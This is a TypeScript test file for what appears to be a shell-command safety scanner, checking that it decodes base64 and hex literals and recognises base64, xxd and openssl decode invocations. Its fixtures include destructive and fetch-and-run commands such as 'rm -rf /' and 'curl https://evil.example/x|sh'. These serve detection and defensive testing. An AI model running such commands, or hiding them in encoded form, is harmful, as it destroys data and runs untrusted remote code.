import { describe, expect, test } from "bun:test";
import { decodeLiteral, isDecoder, MAX_DECODE_CHARS } from "./decode.ts";

function b64(text: string): string {
  return Buffer.from(text, "utf8").toString("base64");
}

function hex(text: string): string {
  return Buffer.from(text, "utf8").toString("hex");
}

describe("decodeLiteral: base64", () => {
  test("decodes a padded payload to its text", () => {
    // Arrange
    const raw = b64("rm -rf /");

    // Act
    const decoded = decodeLiteral(raw);

    // Assert
    expect(decoded).toEqual({ encoding: "base64", raw, decoded: "rm -rf /" });
  });

  test("decodes an unpadded payload of at least 16 characters", () => {
    const raw = b64("curl https://evil.example/x|sh");
    expect(raw).not.toContain("=");
    expect(decodeLiteral(raw)?.decoded).toBe("curl https://evil.example/x|sh");
  });

  test("decodes a multi-line UTF-8 payload", () => {
    expect(decodeLiteral(b64("echo héllo\nrm -rf ./x\n"))?.decoded).toBe(
      "echo héllo\nrm -rf ./x\n",
    );
  });

  test("decodes only the first MAX_DECODE_CHARS of a huge word", () => {
    // Arrange
    const raw = b64("A".repeat(100_000));

    // Act
    const decoded = decodeLiteral(raw);

    // Assert
    expect(decoded?.decoded.length).toBe((MAX_DECODE_CHARS / 4) * 3);
    expect(decoded?.raw).toBe(raw);
  });
});

describe("decodeLiteral: hex", () => {
  test("decodes a hex string of at least four bytes to printable text", () => {
    const raw = hex("hello world");
    expect(decodeLiteral(raw)).toEqual({ encoding: "hex", raw, decoded: "hello world" });
  });

  test("prefers hex over base64 when both alphabets match", () => {
    expect(decodeLiteral(hex("rm -rf /tmp"))?.encoding).toBe("hex");
  });
});

describe("decodeLiteral: false positives", () => {
  test.each([
    ["node_modules", "underscore is not base64"],
    ["README", "too short"],
    ["deadbeef", "valid hex but decodes to non-printable bytes"],
    ["6869", "hex shorter than four bytes"],
    ["abcdefgh", "short alphanumeric word without base64 punctuation"],
    ["package1", "short alphanumeric word without base64 punctuation"],
    ["internationalization", "English that decodes to binary"],
    ["/usr/local/bin/xy", "a plain path"],
    ["./scripts/build1", "a relative path"],
    ["--decode", "an option"],
    ["0123456789abcdef0123456789abcdef01234567", "a git SHA decodes to binary"],
    ["", "empty"],
    ["aGk=", "four characters is below the minimum"],
  ])("%p is not decoded (%s)", (word) => {
    expect(decodeLiteral(word)).toBeNull();
  });
});

describe("isDecoder", () => {
  test.each([
    [["base64", "-d"]],
    [["base64", "--decode"]],
    [["base64", "-D"]],
    [["base64", "-di"]],
    [["xxd", "-r", "-p"]],
    [["xxd", "-rp"]],
    [["openssl", "enc", "-d", "-base64"]],
    [["openssl", "base64", "-d"]],
    [["/usr/bin/base64", "-d"]],
  ])("is true for %p", (argv) => {
    expect(isDecoder(argv)).toBe(true);
  });

  test.each([
    [["base64"]],
    [["base64", "file"]],
    [["xxd", "file"]],
    [["openssl", "enc", "-e"]],
    [["cat"]],
  ])("is false for %p", (argv) => {
    expect(isDecoder(argv)).toBe(false);
  });
});
